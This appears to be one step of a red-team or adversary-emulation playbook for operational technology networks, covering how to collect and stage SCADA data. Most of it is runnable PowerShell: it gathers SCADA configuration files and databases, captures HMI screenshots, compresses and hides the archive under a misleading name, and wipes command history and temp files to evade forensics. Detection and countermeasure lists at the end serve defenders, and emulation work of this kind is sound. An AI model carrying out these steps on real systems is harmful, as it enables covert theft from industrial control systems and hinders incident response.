# Step 7: Collection & Staging

**Objective**:
- Identify and gather sensitive OT system data (e.g., SCADA configuration files, logs, or database exports) relevant to operational technology processes.
Compress and stage this data stealthily on the OT host, preparing it for covert exfiltration without alerting defenders.
---

## Context

- Operator has established persistence and appropriate credentials on OT subnet hosts.
- Access to OT file shares, local storage, and system resources is available.
- Native Windows tools and living-off-the-land binaries (LOLBins) are leveraged to avoid introducing suspicious software.
- The OT environment has limited or specialized monitoring compared to IT networks, requiring subtlety.

---

## Execution

### 1.Discover Data of Interest
Explore directories likely to contain sensitive OT data:
#### Search common locations
```powershell
Get-ChildItem "C:\SCADA" -Recurse -Include *.xml, *.csv, *.bak, *.mdb, *.sdf
Get-ChildItem "C:\Program Files\*" -Recurse -Include *.config
```
Check network shares:
#### Discover shared drives
```powershell
net use
Get-SmbShare
```

### 2. Copy or Aggregate the Files
Copy interesting files to a working directory on the local machine:
```powershell
New-Item -ItemType Directory -Path C:\ProgramData\logs -Force
Copy-Item "C:\SCADA\config.xml" -Destination "C:\ProgramData\logs\" -Force
Copy-Item "C:\ProgramData\control.db" -Destination "C:\ProgramData\logs\" -Force
```

### 3. Take a Screenshot of HMI
```powershell
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save("C:\ProgramData\logs\hmi_screen.png")
```

### 4. Compress the Collected Data
Use native Windows utilities to compress the data:
```powershell
makecab.exe C:\ProgramData\logs\config.xml C:\ProgramData\logs\archive.dbx
```

### 5. Obfuscate and Hide the Staged File
Make it harder to detect:
#### Rename and hide the file
```powershell
Rename-Item -Path "C:\ProgramData\logs\archive.dbx" -NewName "syslog.dbx"
attrib +h +s "C:\ProgramData\logs\syslog.dbx"
```

### 6. Clean Up
Wipe PowerShell history and enviorment variables:
```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
Clear-Content "$env:TEMP\*"
```

---

## Result

- Sensitive OT data is successfully located, copied, and compressed into a single archive file.
- The archive is stored in a legitimate-looking, hidden directory on the OT host with timestamps and naming conventions designed to avoid detection.
- The file remains accessible for retrieval during a subsequent exfiltration phase.
- Minimal forensic footprint is left behind by the compression and staging activity.

---

## Detection Opportunities

- File system monitoring detecting unusual file creation or modification in directories such as `C:\ProgramData\`, `C:\Windows\Temp\`, or rarely used folders.
- Execution of archive or compression tools (makecab.exe, Compress-Archive) within OT systems, especially if uncommon.
- Creation of new or modified hidden files with unusual extensions (e.g., .dbx, .blk) that deviate from normal system file baselines.
- Increased read activity on sensitive OT file shares or config directories outside typical maintenance windows.
- Abnormal user activity patterns, such as local admin sessions executing PowerShell or command line tools for file operations.
- Unusual network traffic if staging triggers data movement to other hosts (monitor SMB, HTTP, or custom tunnels).

---

## Defensive Countermeasures

- Implement and tune file integrity monitoring (FIM) on critical OT directories to alert on unauthorized file changes or creation.
- Enable process monitoring and alerting for the execution of compression utilities or uncommon binaries on OT systems.
- Enforce strict access controls and auditing on OT file shares and configuration repositories, limiting access to only authorized personnel and systems.
- Apply behavioral analytics to detect abnormal file access patterns and privilege escalations.
- Deploy endpoint detection and response (EDR) solutions capable of identifying suspicious PowerShell usage and living-off-the-land technique patterns.
- Regularly update OT system baselines to recognize legitimate versus anomalous activity, refining detection rules over time.
- Train blue teams to correlate suspicious local file system activity with broader lateral movement or exfiltration indicators.
